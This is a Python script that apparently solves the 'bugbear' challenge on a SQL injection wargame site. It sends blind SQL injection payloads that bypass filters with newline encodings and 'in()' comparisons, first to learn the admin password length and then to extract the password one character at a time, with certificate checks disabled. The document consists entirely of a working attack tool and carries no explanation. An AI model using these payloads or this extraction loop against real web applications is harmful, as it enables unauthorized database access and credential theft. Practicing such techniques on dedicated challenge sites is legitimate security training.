import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
headers = {'Cookie': ''}


for i in range(1, 10):
    payload1 = '?no=""||id%0ain("admin")%26%26length(pw)%0ain('+str(i)+')'+'%23'
    res1 = sess.get(url=URL + payload1, headers=headers, verify=False)
    if 'Hello admin' in res1.text:
        print('Password Length : %d' %i)
        break
    else:
        pass

Password = ''
for j in range(1, 11):
    for i in range(48, 128):
        payload2 = '?no=""||id%0ain("admin")%26%26left(pw,'+str(j)+')%0ain("'+Password+chr(i)+'")'
        res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
        if 'Hello admin' in res2.text:
            print('Password %d: %d' %(j,i))
            if 64 < i < 90:
                continue
            else:
                Password = Password + chr(i)
                break
        else:
            pass
print(Password)



